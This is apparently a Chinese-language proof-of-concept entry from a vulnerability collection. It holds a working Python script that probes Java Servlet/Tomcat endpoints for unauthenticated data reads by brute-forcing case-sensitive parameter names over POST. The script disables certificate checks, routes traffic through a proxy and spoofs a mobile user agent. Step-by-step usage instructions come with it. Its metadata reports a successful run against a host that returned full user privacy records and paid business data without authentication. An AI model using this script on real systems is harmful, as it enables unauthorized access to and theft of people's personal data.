# Java Servlet 未授权数据读取探测（POST + userid 参数 + 404/500/200 判别）

- **code**: java-servlet-未授权数据读取探测-post-userid-参数-404-500-200-判别
- **kind**: poc
- **category**: unauthorized
- **component**: Java Servlet / Tomcat (LHService 系列)
- **severity**: high
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 example.com（203.0.113.13，Tomcat 9.0.122）上验证成功：参数名 userid（严格区分大小写，uid/id/fid/token/key 等均返回 500）。命中 4 个未授权数据读取端点：/LHService/userinfo(userid=2)->1138 字节完整用户隐私记录 45 字段（含 quanxian 权限位/vip/renzheng）；/LHService/userxunzhang(userid=2)->360 字节勋章数组；/LHService/zj_info(userid=2)->3780 字节专家付费推荐数据；/Tk_Kj/getShangbang(userid=2)->8942 字节上榜业务数据。零认证、无 Cookie、无 Referer 校验。
- **path**: pocs/java-servlet-未授权数据读取探测-post-userid-参数-404-500-200-判别/servlet_unauth_probe.py
- **tags**: java,servlet,tomcat,未授权访问,参数爆破,userid
- **created_at**: 2026-10-03T16:41:39.084Z
- **found_by**: vuln-scan

## 描述

针对老式 Java/JSP Servlet 业务系统的未授权数据读取探测：POST + 业务参数名（含大小写变体）+ 404/500/200 端点存在性判别。适用于任何 Tomcat 挂载自定义 servlet 的业务系统。

## 用法

```
1) 改 BASE 为目标地址；2) ENDPOINTS 从目标的 APK/DEX 字符串表或目录爆破获得；3) PARAMS 用业务字段名 + 大小写变体；4) python servlet_unauth_probe.py。<br>命中判据：200 且返回体长度 &gt;20 且不以 "-" 开头（"-请重新登录" 等为鉴权占位串）。<br>前置：先用 GET 扫端点，500 表示 servlet 存在但缺参数；再单参数隔离定位参数名。
```

## 正文

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""自定义 Java Servlet 未授权数据读取探测 —— POST + 业务参数名

原理：
  这类老式 Java(JSP/Servlet) 业务系统的 servlet 常用 request.getParameter("userid")
  读取整型参数。GET 无参数 -> NumberFormatException -> Tomcat 500 错误页（该页还会
  泄露完整 Java 栈，含类名/文件名/行号）。

关键手法：
  1. 先用「404 vs 500 vs 200」区分端点：404=不存在；500=存在但缺参数（可读栈）；
     200=存在且可响应。
  2. 参数名必须穷举。这类系统的参数名往往不是 uid/id，而是 userid（全小写），
     且 **严格区分大小写**（getParameter 硬编码）。用「正确名 -> 200 有数据；
     错误名 -> 500」做单参数隔离，可精确定位参数名。
  3. 必须用 POST + application/x-www-form-urlencoded（很多 servlet doPost/doGet
     都实现，但取值逻辑在 doPost；GET 会因 parse 空值抛异常）。
"""
import ssl, urllib.request, urllib.error, sys

PROXY = "http://127.0.0.1:7892"   # 按环境调整；无代理则置 None
ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
handlers = [urllib.request.HTTPSHandler(context=ctx)]
if PROXY:
    handlers.append(urllib.request.ProxyHandler({"http": PROXY, "https": PROXY}))
op = urllib.request.build_opener(*handlers)
UA = "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/110 Mobile"


def post(url, data, timeout=15, n=8000):
    """POST form-urlencoded，返回 (status, text)"""
    h = {"User-Agent": UA, "Connection": "close",
         "Content-Type": "application/x-www-form-urlencoded"}
    r = urllib.request.Request(url, data=data.encode(), headers=h, method="POST")
    try:
        with op.open(r, timeout=timeout) as resp:
            return resp.status, resp.read(n).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(n).decode("utf-8", "replace")
    except Exception as e:
        return -1, f"{type(e).__name__}: {e}"


def probe_unauth(base, endpoints, param_candidates, value=2):
    """对每个端点 × 每个候选参数名发 POST，记录 200 且有数据的命中"""
    hits = []
    for ep in endpoints:
        url = base.rstrip("/") + ep
        for pn in param_candidates:
            st, txt = post(url, f"{pn}={value}")
            # 200 且返回体不是"请重新登录"/"-1"这类占位串 => 命中真实数据
            if st == 200 and len(txt) > 20 and not txt.startswith("-"):
                hits.append({"url": url, "param": pn, "status": st,
                             "len": len(txt), "body": txt[:500]})
                print(f"[DATA] {url}  ?{pn}={value} -> {st} len={len(txt)}")
                print(f"       {txt[:300]!r}")
                break
    return hits


if __name__ == "__main__":
    BASE = "https://example.com"
    # 端点字典来源：目标 APK/DEX 的字符串常量池（全部 servlet 路径）
    ENDPOINTS = ["/LHService/userinfo", "/LHService/userxunzhang", "/LHService/zj_info",
                 "/LHService/userlist", "/LHService/paylog", "/Tk_Kj/getShangbang"]
    # 参数名字典：业务字段名 + 大小写变体（严格区分大小写，必须都试）
    PARAMS = ["userid", "USERID", "Userid", "uid", "id", "fid", "tid",
              "page", "limit", "start", "key", "name", "type", "num"]
    res = probe_unauth(BASE, ENDPOINTS, PARAMS)
    print(f"\n=== 未授权数据读取点: {len(res)}")

```
